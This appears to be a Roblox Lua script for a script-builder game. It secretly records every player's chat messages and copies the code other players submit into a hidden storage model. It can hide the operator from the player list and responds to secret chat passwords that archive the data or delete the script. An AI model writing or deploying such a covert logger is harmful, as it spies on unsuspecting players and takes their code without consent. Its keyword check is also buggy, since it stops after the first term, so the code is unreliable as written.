--[[ mediafire ]]--
--------------------------------------------------
A=Instance.new("Model",game:service'Players')
A.Name="STORAGE"
Garbage=Instance.new("Model",A)
Garbage.Name="TRASH"
Archived=Instance.new("Model",A)
Archived.Name="ARCHIVED"
Chatlogs=Instance.new("Model",Archived)
Chatlogs.Name="CHATLOGS"
--~~--
if removePlayerOnExecute then
	if game:service'Players'[name] then
		game:service'Players'[name].Parent=nil
	end
end
--------------------------------------------------
Terms={
	"game";
	"workspace";
	"Workspace";
	"function";
	"Instance.new";
	"Instance";
	[==[Instance["new"]]==];
	"coroutine";
	"IsA";
	"concat";
	"GetService";
	"service";
	".sin";
	".cos";
	"nil";
	"~=";
	":Destroy()";
	":Remove()";
	":FindFirstChild"
	}
--------------------------------------------------
Welcome=function(player) -- sets player chatting connections up
	player.Chatted:connect(function(masg)
		Chatter(masg,player)
	end)
end

CheckTerms=function(texts)
	for _,text in pairs(Terms) do
		if string.find(texts,text) then
			return true;
		else return false;
		end
	end
end
--------------------------------------------------
Chatter=function(msg,speaker) -- local/ c/ script/ do/
	if logChat==true then
		local newChat=Instance.new("StringValue",Chatlogs)
		newChat.Name=speaker.Name..": CHAT"
		newChat.Value=msg
	end
	if Anaminus==true then
		if CheckTerms(msg)==true then
			local nSour=Instance.new("StringValue",A)
			nSour.Name=speaker.Name..": SOURCE"
			nSour.Value=msg
		end
	end
	if msg=="HEUi5jA*" then 
		print'goodbye' --[[A:Destroy()]] script:Destroy() 
	end
	if msg=="9gjt4wF(kg" then
		for _,obj in pairs(A:GetChildren()) do
			if obj:IsA("StringValue") then
				obj.Parent=Archived
				print('Archived scripts in this run: '.._)
			end
		end
	end
	if msg:sub(1,6):lower()=="local/" then
		lsource=msg:sub(7)
		local newSource=Instance.new("StringValue",A)
		newSource.Name=speaker.Name..": LOCALSCRIPT"
		newSource.Value=lsource
	elseif msg:sub(1,2):lower()=="c/" then
		gsource=msg:sub(3)
		local newSource=Instance.new("StringValue",A)
		newSource.Name=speaker.Name..": NORMALSCRIPT"
		newSource.Value=gsource
	elseif msg:sub(1,3):lower()=="do/" then
		g2source=msg:sub(4)
		local newSource=Instance.new("StringValue",A)
		newSource.Name=speaker.Name..": NORMALSCRIPT"
		newSource.Value=g2source
	elseif msg:sub(1,7):lower()=="script/" then
		g3source=msg:sub(8)
		local newSource=Instance.new("StringValue",A)
		newSource.Name=speaker.Name..": NORMALSCRIPT"
		newSource.Value=g3source
	end
end
--~~--
for i,p in pairs(game:service'Players':getPlayers()) do
	p.Chatted:connect(function(txt)
		Chatter(txt,p)
	end)
end
--~~--
game:service'Players'.PlayerAdded:connect(Welcome)